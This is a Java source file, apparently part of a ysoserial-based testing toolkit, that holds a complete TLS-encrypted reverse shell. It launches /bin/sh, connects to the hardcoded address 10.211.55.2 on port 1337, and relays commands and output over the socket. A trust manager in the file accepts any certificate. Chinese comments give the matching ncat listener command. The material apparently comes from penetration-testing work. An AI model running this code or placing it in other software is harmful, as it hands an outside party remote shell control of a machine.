package ysoserial.test.tool;

import java.io.InputStream;
import java.io.OutputStream;
import javax.net.ssl.*;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import java.security.cert.X509Certificate;
import javax.net.ssl.X509TrustManager;

/*SSL 加密的Java socks反弹shell。 ncat -nlvp 1337 --ssl
 https://github.com/CalfCrusher/JavaAndroidReverseShell/tree/main/SSL
 implements X509TrustManager，只用一个类*/

public class tlsShell5 implements X509TrustManager{

// 直接implements
    public void checkClientTrusted(X509Certificate[] certs, String authType) {
    }
    public void checkServerTrusted(X509Certificate[] certs, String authType) {
    }
    public X509Certificate[] getAcceptedIssuers() {
        return null;
    }


    public static void main(String[] args) throws Exception {
        String host = "10.211.55.2";
        int port = 1337;
        String[] cmd = {"/bin/sh"};

        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        SSLContext sslContext = SSLContext.getInstance("TLS");
        sslContext.init(null, new TrustManager[] {new tlsShell5()}, new java.security.SecureRandom());
        SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
        SSLSocket s = (SSLSocket) sslSocketFactory.createSocket(host, port);
        s.startHandshake();
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        BufferedReader bsi = new BufferedReader(new InputStreamReader(s.getInputStream()));
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            String line = bsi.readLine();
            if (line != null) {
                po.write((line + "\n").getBytes());
            }
            else {
                bsi.close();
            }
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}

